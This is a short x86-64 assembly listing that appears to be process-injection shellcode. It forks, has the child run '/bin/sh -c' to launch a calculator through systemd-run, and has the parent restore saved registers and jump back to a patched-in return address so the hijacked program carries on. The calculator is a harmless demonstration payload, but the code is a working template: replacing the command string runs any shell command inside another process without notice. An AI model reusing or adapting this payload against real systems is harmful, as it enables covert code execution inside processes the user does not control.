[bits 64]

saved_rip:
dq 0xd00df00d
saved_rax:
dq 0x0
saved_rdi:
dq 0x0
saved_rsi:
dq 0x0
saved_rdx:
dq 0x0

code:
    mov rax, 0x39  ; SYS_fork
    syscall
    test rax, rax
    jz do_execve
    mov rax, [rel saved_rax]
    mov rdi, [rel saved_rdi]
    mov rsi, [rel saved_rsi]
    mov rdx, [rel saved_rdx]
    jmp [rel saved_rip]
do_execve:
    push 0
    lea rax, [rel arg3]
    push rax
    lea rax, [rel arg2]
    push rax
    lea rax, [rel arg1]
    push rax

    mov rax, 0x3b  ; SYS_execve
    lea rdi, [rel arg1]
    lea rsi, [rsp]
    lea rdx, [rsp+0x18]
    syscall

arg1:
db '/bin/sh', 0
arg2:
db '-c', 0
arg3:
db 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$UID/bus systemd-run --user kcalc > /dev/null', 0
